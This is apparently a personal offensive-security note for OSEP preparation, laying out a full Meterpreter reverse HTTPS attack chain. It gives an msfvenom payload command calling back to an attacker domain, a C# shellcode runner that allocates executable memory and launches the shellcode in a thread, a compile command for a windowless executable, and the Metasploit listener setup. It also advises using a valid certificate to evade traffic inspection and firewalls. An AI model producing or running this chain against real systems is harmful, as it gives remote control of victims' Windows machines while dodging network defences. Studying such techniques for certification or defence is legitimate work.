This is more kind of stuff needed for OSEP but I just put it here.

This runner is gonna be detected by EDR but I provide you some starting point.

Uses https with valid domain and certificate to avoid DPI and firewall. DO NOT EVER use inbuilt metasploit default certs.

* get A record for your VPS 
* generate cert for MSF  

```bash
cat privkey.pem cert.pem > msf.pem
```

* Generate shellcode

```bash

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=your-domain.com LPORT=443 LURI='/api/v1/users' LHandlerSSLCert=/path/to/msf.pem StagerVerifySSLCert=true -f csharp


```

* Copy paste shell code into `runner.cs`

```cs
using System;

using System.Runtime.InteropServices;

  

namespace ShellcodeRunner

{

class Program

{

[DllImport("kernel32.dll")]

static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]

static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]

static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);


[DllImport("kernel32.dll")]

static extern bool FreeConsole();
 

const uint MEM_COMMIT = 0x1000;

const uint PAGE_EXECUTE_READWRITE = 0x40; 

static void Main()

{

byte[] buf = new byte[] {COPY SHELL CODE PASTE HERE};

  
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Marshal.Copy(buf, 0, addr, buf.Length);

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

WaitForSingleObject(hThread, 0xFFFFFFFF);

}

}

}
```

* Compile using Dev Console in Visual Studio (no proj needed):
`csc.exe /target:winexe /out:Runner_no_console.exe runner.cs`

* Configure and run the listener:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST your-domain.com
set LPORT 443
set HandlerSSLCert /path/to/msf.pem
set StagerVerifySSLCert true
set ExitOnSession false
exploit -j -z
```